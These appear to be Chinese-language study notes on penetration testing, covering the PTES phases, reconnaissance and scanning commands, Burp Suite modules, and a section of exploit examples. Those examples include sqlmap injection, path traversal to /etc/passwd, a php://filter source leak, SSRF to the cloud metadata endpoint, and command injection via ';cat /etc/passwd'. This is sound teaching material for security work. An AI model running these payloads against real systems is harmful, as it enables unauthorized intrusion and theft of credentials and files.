## 核心知识点

### 一、渗透测试流程（PTES）

1. **前期交互：** 确定范围、规则、目标
2. **情报收集：** 被动/主动收集目标信息
3. **威胁建模：** 分析攻击面和攻击路径
4. **漏洞分析：** 发现潜在漏洞
5. **漏洞利用：** 验证漏洞可利用性
6. **后渗透：** 权限维持、横向移动
7. **报告输出：** 漏洞详情、风险评估、修复建议

### 二、信息收集

```bash
# 子域名枚举
subfinder -d example.com
amass enum -d example.com

# 端口扫描
nmap -sV -sC -O -A target.com
nmap -p 1-65535 -T4 target.com

# 目录爆破
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com

# 指纹识别
whatweb http://target.com
wappalyzer（浏览器插件）

# Google Hacking
site:example.com filetype:sql
site:example.com inurl:admin
```

### 三、Burp Suite 使用

- **Proxy：** 拦截和修改 HTTP/HTTPS 请求
- **Spider：** 自动爬取网站页面
- **Scanner：** 自动漏洞扫描（Pro 版）
- **Intruder：** 自动化攻击（暴力破解、Fuzzing）
- **Repeater：** 手动重放和修改请求
- **Decoder：** 编码解码工具

### 四、常见漏洞利用

```bash
# SQL 注入利用
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# XSS 利用
# 存储型 XSS：在评论/留言中注入脚本

# 文件包含
http://target.com/page?file=../../../../etc/passwd
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php

# SSRF（服务端请求伪造）
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
# 访问内网元数据服务

# 命令注入
http://target.com/ping?ip=127.0.0.1;cat /etc/passwd
```
